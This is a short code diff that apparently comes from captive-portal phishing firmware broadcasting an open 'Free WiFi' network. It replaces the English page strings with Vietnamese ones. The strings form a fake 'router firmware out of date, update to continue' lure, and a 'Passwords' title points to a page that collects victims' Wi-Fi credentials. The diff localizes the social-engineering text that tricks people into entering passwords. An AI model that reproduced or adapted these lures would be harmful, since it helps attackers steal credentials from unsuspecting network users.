@@ -11,13 +11,13 @@
 const char* SSID_NAME = "Free WiFi";
 
 // Default main strings
-#define SUBTITLE "Router info."
-#define TITLE "Update"
-#define BODY "Your router firmware is out of date. Update your firmware to continue browsing normally."
-#define POST_TITLE "Updating..."
-#define POST_BODY "Your router is being updated. Please, wait until the proccess finishes.</br>Thank you."
-#define PASS_TITLE "Passwords"
-#define CLEAR_TITLE "Cleared"
+#define SUBTITLE "Thông tin bộ định tuyến."
+#define TITLE "Cập nhật"
+#define BODY "Phần mềm bộ định tuyến của bạn đã lỗi thời. Cập nhật chương trình cơ sở của bạn để tiếp tục sử dụng bình thường."
+#define POST_TITLE "Đang cập nhật..."
+#define POST_BODY "Bộ định tuyến của bạn đang được cập nhật. Vui lòng đợi cho đến khi quá trình kết thúc.</br>Cảm ơn."
+#define PASS_TITLE "Mật Khẩu"
+#define CLEAR_TITLE "Đã xóa"
 
 // Init system settings
 const byte HTTP_CODE = 200;
